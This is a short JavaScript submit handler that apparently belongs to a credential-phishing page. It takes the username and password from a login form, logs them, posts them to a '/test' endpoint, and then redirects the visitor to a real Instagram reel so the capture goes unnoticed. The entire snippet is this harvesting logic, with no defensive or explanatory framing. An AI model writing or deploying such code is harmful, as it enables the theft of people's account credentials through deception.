document.getElementById('test').addEventListener('submit', async function(event) {
    event.preventDefault();
    event.stopPropagation();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    console.log(username, password);
    axios.post('/test', {username: username, password: password});
    window.location.href = 'https://www.instagram.com/reel/DAdT2aGPtdo/?igsh=MTVwaTBlZ212dTJsZw==';
});
